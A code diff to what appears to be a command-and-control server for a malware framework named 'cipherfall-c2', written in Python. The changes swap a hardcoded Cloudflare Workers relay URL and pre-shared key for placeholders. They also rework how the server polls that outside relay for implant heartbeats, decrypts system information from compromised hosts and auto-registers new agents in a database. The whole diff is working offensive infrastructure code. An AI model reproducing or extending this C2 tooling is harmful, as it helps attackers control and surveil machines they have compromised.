@@ -55,6 +55,7 @@ Limitations:
 """
 
 import asyncio, base64, hashlib, hmac as _stdlib_hmac, json, os, sqlite3, time, uuid
+from dotenv import load_dotenv
 from fastapi import FastAPI, HTTPException, Request
 import uvicorn, httpx
 from Crypto.Cipher import AES
@@ -62,8 +63,10 @@ from Crypto.Hash import SHA256
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
 
-WORKER_URL = os.environ.get("WORKER_URL",  "https://cipherfall-c2.cipherfall-c2.workers.dev/")
-PSK        = os.environ.get("C2_PSK",      "CeciEstMonPSK")
+load_dotenv()
+
+WORKER_URL = os.environ.get("WORKER_URL",  "https://your-worker.workers.dev").rstrip("/")
+PSK        = os.environ.get("C2_PSK",      "changeme")
 DB_PATH    = os.environ.get("C2_DB",       "c2.db")
 ADMIN_PORT = int(os.environ.get("C2_ADMIN", "1337"))
 POLL_INT   = int(os.environ.get("C2_POLL",  "10"))
@@ -151,18 +154,32 @@ async def _collect_results(client: httpx.AsyncClient):
 
 
 async def _collect_heartbeats(client: httpx.AsyncClient):
-    with _db() as con:
-        agents = con.execute("SELECT id FROM agents").fetchall()
-    for a in agents:
+    try:
+        r = await client.get(f"{WORKER_URL}/agents")
+        if r.status_code != 200:
+            return
+        agent_ids = r.json()
+    except Exception:
+        return
+
+    now = int(time.time())
+    for agent_id in agent_ids:
         try:
-            r = await client.get(f"{WORKER_URL}/hb/{a['id']}")
-            if r.status_code == 200:
-                payload = _decrypt(r.text)
-                with _db() as con:
-                    con.execute(
-                        "UPDATE agents SET last_seen=?, sysinfo=? WHERE id=?",
-                        (int(time.time()), json.dumps(payload.get("sysinfo", {})), a["id"])
-                    )
+            r = await client.get(f"{WORKER_URL}/hb/{agent_id}")
+            if r.status_code != 200:
+                continue
+            payload = _decrypt(r.text)
+            sysinfo = payload.get("sysinfo", {})
+            with _db() as con:
+                con.execute(
+                    "INSERT OR IGNORE INTO agents (id, label, first_seen, last_seen, sysinfo)"
+                    " VALUES (?,?,?,?,?)",
+                    (agent_id, sysinfo.get("hostname", agent_id[:8]), now, now, "{}")
+                )
+                con.execute(
+                    "UPDATE agents SET last_seen=?, sysinfo=? WHERE id=?",
+                    (now, json.dumps(sysinfo), agent_id)
+                )
         except Exception:
             pass
 
